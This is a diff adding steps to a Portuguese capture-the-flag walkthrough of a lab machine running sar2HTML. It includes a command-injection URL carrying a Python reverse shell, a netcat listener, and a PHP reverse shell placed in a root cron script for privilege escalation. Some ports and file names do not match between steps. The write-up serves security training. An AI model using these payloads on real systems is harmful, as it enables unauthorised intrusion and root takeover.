@@ -103,7 +103,97 @@ Tentando o terceiro método primeiro, para isso basta verificar se á máquina a
   Como podemos ver acima o comando não retornou nada. Então vamos tentar o primeiro método. Para isso basta verificar se existe python ou perl instalando no sistema. Testando python primerio
   
    <h1 align="center">
-  <img alt="" title="Imagem9" src="Imagens/Imagem9.png" />
+  <img alt="" title="Imagem11" src="Imagens/Imagem11.png" />
   </h1>
   
-  Como podemos ver na imagem, python está disponível no alvo e pode ser usado para conexão reversa. 
+  Como podemos ver na imagem, python está disponível no alvo e pode ser usado para conexão reversa. Agora é necessário executar o script de conexão reversa na máquina alvo, imagem abaixo.
+  
+    
+   <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  **URL: 192.168.1.24/sar2HTML/index.php?plot=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.20%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27**
+  
+  
+  **_Comando usado:_**
+  
+  1.  <<python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.20”,4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’>>
+  2.  <<nc -lvp 1234>>
+  
+  Como se pode ver, eu coloquei o netcat para rodar na porta <<4321>> e então inserir o comando o navegador para receber a conexão reversa.
+  
+  
+  # Passo 6
+  
+  Agora temos o acesso a shell, mas é uma acesso limitado. E o objectivo é conseguir acesso root. Então primeiro exectuta-se o comando para que nos dá acesso estável a shell.
+  
+    <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  **python3 -c ‘import pty;pty.spawn(“/bin/bash”)’**
+  
+  E então eu quero saber a vesão do kernel linux:
+  
+  **uname -a**
+  
+  E a versão do sistema operacional
+  
+  **cat /etc/issue**
+  
+  Com essas informações em mãos pode-se pesquisar e ver o que se encontra. Procurando exploits online, nenhum pareceu atender. Entretanto, explorando o sistema por mais informações, conseguimos uma "user flag", como mostrado no print abaixo:
+  
+   <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  **cd /home/love/Desktop**
+  **cat user.txt**
+   Podemos ler o arquivo user.txt.
+   
+ # Passo 7
+ 
+ 
+ Buscando por permissões de arquivo **<<cat /etc/crontab>>**, temos um Cron que é executado como root a cada 5 minutos
+  
+   <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  O Cron está rodando a partir de um arquivo, "finally.sh" como visto na imagem
+    
+   <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  Mudando de diretório para **/var/www/html**  e lendos os  arquivos e suas permissões pode-se ver que com o nível de acesso atual, é possivel editar o arquivo "write.sh", que será excutado pelo Cron, que por sua vez roda como root.
+  
+  Agora ajustamos uam connexão reversa com php dentro do arquivo write.sh
+  
+  **_php -r ‘$sock=fsockopen(“192.168.1.20”,4444);exec(“/bin/sh -i<&3 >&3 2>&3”);’_**
+  
+  Esse comando o sistema alvo se conectará a nós (conexão reversa) na porta 4444. Como a ativade Cron estava configurada para executar a cada 5 minutos, aguardando esse tempo temos a conexão.
+  
+   <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1> 
+  
+  Agora que temos acesso root, podemos, objetivo deste CTF, Podemos ler a flag **cat root.txt**
+  
+  <h1 align="center">
+  <img alt="" title="Imagem12" src="Imagens/Imagem12.png" />
+  </h1>
+  
+  Podemos fazer qualquer coisa no sistema agora e isso completa o CTF.
+  
+  
+  
+  
+ 
+  
+  
+  
+  
+  
+  
